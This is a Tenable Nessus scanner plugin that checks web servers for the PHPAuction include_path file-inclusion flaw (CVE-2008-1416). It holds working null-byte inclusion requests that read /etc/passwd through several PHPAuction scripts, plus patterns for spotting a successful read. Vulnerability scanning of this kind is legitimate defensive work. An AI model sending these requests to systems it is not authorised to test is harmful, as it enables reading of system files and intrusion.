#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(31608);
  script_version("1.21");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2008-1416");
  script_bugtraq_id(28284);
  script_xref(name:"EDB-ID", value:"5266");
  script_xref(name:"SECUNIA", value:"29422");

  script_name(english:"PHPAuction Multiple Script include_path Parameter File Inclusion");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is susceptible
to remote file include attacks.");
  script_set_attribute(attribute:"description", value:
"The remote host is running PHPAuction, a PHP script for building
auction websites. 

The version of PHPAuction installed on the remote host fails to
sanitize input to the 'include_path' parameter of several scripts
before using it to include PHP code.  An unauthenticated, remote
attacker can exploit this issue to view arbitrary files on the remote
host or to execute arbitrary PHP code, possibly taken from third-party
hosts. 

Note that while successful exploitation requires PHP's
'register_globals' setting to be enabled, the application will not
work if that setting is disabled.");
  script_set_attribute(attribute:"solution", value:
"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:"CANVAS");
  script_cwe_id(94);

  script_set_attribute(attribute:"plugin_publication_date", value:"2008/03/19");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:phpauction:phpauction");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_version.nasl");
  script_require_keys("www/PHP");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("data_protection.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


file = "/etc/passwd";
if (thorough_tests) 
{
  exploits = make_list(
    string("converter.inc.php?include_path=", file, "%00"),
    string("messages.inc.php?include_path=", file, "%00&lan=EN"),
    string("settings.inc.php?include_path=", file, "%00")
  );
}
else 
{
  exploits = make_list(
    string("converter.inc.php?include_path=", file, "%00")
  );
}

# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/phpauction", "/auction", cgi_dirs()));
else dirs = make_list(cgi_dirs());

info = "";
contents = "";

foreach dir (dirs)
{
  foreach exploit (exploits)
  {
    # Try to retrieve a local file.
    r = http_send_recv3(method:"GET", 
      item:string(dir, "/includes/", exploit), 
      port:port
    );
    if (isnull(r)) exit(0);
    res = r[2];

    if ("converter" >< exploit) inc_file = "nusoap.php";
    else if ("messages" >< exploit) inc_file = "messages.EN.inc.php";
    else if ("settings" >< exploit) inc_file = "fonts.inc.php";
    else
    {
      debug_print("unknown exploit - '" + exploit + "'!");
      inc_file = "";
    }

    # There's a problem if...
    if (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error because magic_quotes was enabled or...
      string("main(", file, "\\0", inc_file, "): failed to open stream") >< res ||
      # we get an error claiming the file doesn't exist or...
      string("main(", file, "): failed to open stream: No such file") >< res ||
      string("include(", file, ") [function.include]: failed to open stream: No such file") >< res ||
      string("require(", file, ") [function.require]: failed to open stream: No such file") >< res ||
      # we get an error about open_basedir restriction.
      string("open_basedir restriction in effect. File(", file) >< res
    )
    {
      exploit = exploit - strstr(exploit, '?');
      info = info +
             "  " + dir + '/includes/' + exploit + '\n';

      if (!contents && egrep(string:res, pattern:"root:.*:0:[01]:"))
      {
        contents = res;
      }
    }
  }
  if (info && !thorough_tests) break;
}


if (info)
{
  if (report_verbosity)
  {
    contents = data_protection::redact_etc_passwd(output:contents);
    if (contents)
      info = string(
        info,
        "\n",
        "And here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        contents
      );

    report = string(
      "\n",
      "The following scripts(s) are vulnerable :\n",
      "\n",
      info
    );
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
}
